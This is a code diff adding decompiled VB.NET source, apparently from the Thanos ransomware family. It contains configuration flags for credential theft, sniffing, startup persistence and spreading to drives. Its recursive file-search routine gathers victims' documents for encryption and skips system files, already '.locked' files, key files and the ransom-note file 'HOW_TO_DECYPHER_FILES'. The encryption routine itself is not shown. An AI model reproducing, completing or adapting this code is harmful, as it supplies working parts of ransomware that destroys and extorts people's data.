+		Public Shared VeryBasicMode As String = "NO"
+
+		' Token: 0x04000044 RID: 68
+		Public Shared HorseMount As String = "YES"
+
+		' Token: 0x04000045 RID: 69
+		Public Shared MyStartName As String = "mystartup.lnk"
+
+		' Token: 0x04000046 RID: 70
+		Public Shared SkipC As String = "NO"
+
+		' Token: 0x04000047 RID: 71
+		Public Shared CatchDrv As String = "NO"
+
+		' Token: 0x04000048 RID: 72
+		Public Shared RichText As String = "NO"
+
+		' Token: 0x04000049 RID: 73
+		Public Shared CredActivate As String = "YES"
+
+		' Token: 0x0400004A RID: 74
+		Public Shared MySign As String = "VGhhbm9z"
+
+		' Token: 0x0400004B RID: 75
+		Public Shared Sniffing As String = "YES"
+
+		' Token: 0x0400004C RID: 76
+		Public Shared Blocks As String = "YES"
+
+		' Token: 0x02000003 RID: 3
+		Public Class RecursiveFileSearch
+			' Token: 0x06000019 RID: 25 RVA: 0x00006490 File Offset: 0x00004690
+			Public Shared Function SearchFiles(rootDir As String) As List(Of String)
+				Dim list As List(Of String) = New List(Of String)()
+				Return Program.RecursiveFileSearch.WalkDirectoryTree(rootDir)
+			End Function
+
+			' Token: 0x0600001A RID: 26 RVA: 0x000064B0 File Offset: 0x000046B0
+			Private Shared Function WalkDirectoryTree(root As String) As List(Of String)
+				Dim array As String() = Nothing
+				Try
+					array = Directory.GetFiles(root, "*.*")
+				Catch
+				End Try
+				If array <> Nothing Then
+					Dim array2 As String() = array
+					Dim i As Integer = 0
+					While i < array2.Length
+						Dim text As String = array2(i)
+						Try
+							If Not text.ToLower().Contains("program files") AndAlso Not text.ToLower().Contains("windows") AndAlso Not text.ToLower().Contains("perflogs") AndAlso Not text.ToLower().Contains("internet explorer") AndAlso Not text.ToLower().Contains("programdata") AndAlso Not text.ToLower().Contains("appdata") AndAlso Not text.ToLower().Contains("autoexec.bat") AndAlso Not text.ToLower().Contains("desktop.ini") AndAlso Not text.ToLower().Contains("autorun.inf") AndAlso Not text.ToLower().Contains("ntuser.dat") AndAlso Not text.ToLower().Contains("iconcache.db") AndAlso Not text.ToLower().Contains("bootsect.bak") AndAlso Not text.ToLower().Contains("boot.ini") AndAlso Not text.ToLower().Contains("ntuser.dat.log") AndAlso Not text.ToLower().Contains("thumbs.db") AndAlso Not text.ToLower().Contains("bootmgr") AndAlso Not text.ToLower().Contains("pagefile.sys") AndAlso Not text.ToLower().Contains("config.sys") AndAlso Not text.ToLower().Contains("ntuser.ini") AndAlso Not text.Contains(Program.Base64Decode("QnVpbGRlcl9Mb2c=")) AndAlso Not text.Contains("RSAKeys") AndAlso Not text.Contains("HOW_TO_DECYPHER_FILES") AndAlso Not text.EndsWith(".locked") AndAlso Not text.EndsWith("exe") AndAlso Not text.EndsWith("dll") AndAlso Not text.EndsWith("EXE") AndAlso Not text.EndsWith("DLL") AndAlso Not text.ToLower().Contains("Recycle.Bin") AndAlso Not text.ToLower().Contains(Program.MyStartName) Then
+								If File.Exists(text) AndAlso CDbl(text.Length) <= Double.Parse(Program.Mb) * 1024.0 * 1024.0 AndAlso Program.Size = "YES" Then
+									Program.RecursiveFileSearch.result.Add(text)
+								ElseIf File.Exists(text) AndAlso Program.Size = "NO" Then
+									Program.RecursiveFileSearch.result.Add(text)
+								End If
+							End If
+						Catch
+						End Try
+						IL_306:
+						i += 1
+						Continue While
+						GoTo IL_306
+					End While
+					Dim directories As String() = Directory.GetDirectories(root)
+					For Each root2 As String In directories
+						Program.RecursiveFileSearch.WalkDirectoryTree(root2)
+					Next
+				End If
+				Return Program.RecursiveFileSearch.result
+			End Function
+
+			' Token: 0x0400004D RID: 77
+			Private Shared log As StringCollection = New StringCollection()
+
+			' Token: 0x0400004E RID: 78
+			Private Shared result As List(Of String) = New List(Of String)()
+		End Class
+	End Class
+End Namespace
